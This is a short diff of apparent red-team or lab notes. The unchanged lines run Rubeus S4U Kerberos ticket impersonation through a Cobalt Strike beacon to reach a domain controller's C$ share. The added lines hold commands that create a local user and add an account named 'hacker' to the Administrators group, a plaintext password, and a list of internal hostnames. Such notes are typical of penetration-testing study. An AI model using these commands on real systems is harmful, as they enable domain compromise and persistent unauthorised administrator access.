@@ -54,3 +54,14 @@ beacon> ls \\dc-2.dev.cyberbotic.io\c$
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:dc-2$ /impersonateuser:Administrator /altservice:cifs/dc-2.dev.cyberbotic.io /self /nowrap /ptt /ticket:<TGT-TICKET>
 beacon> run klist
 beacon> ls \\dc-2.dev.cyberbotic.io\c$
+
+### ruben password123!
+net user username password /add
+net localgroup Administrators hacker /add
+
+
+dnshostname
+ad.kato.org
+jmp.kato.org
+db.kato.org
+
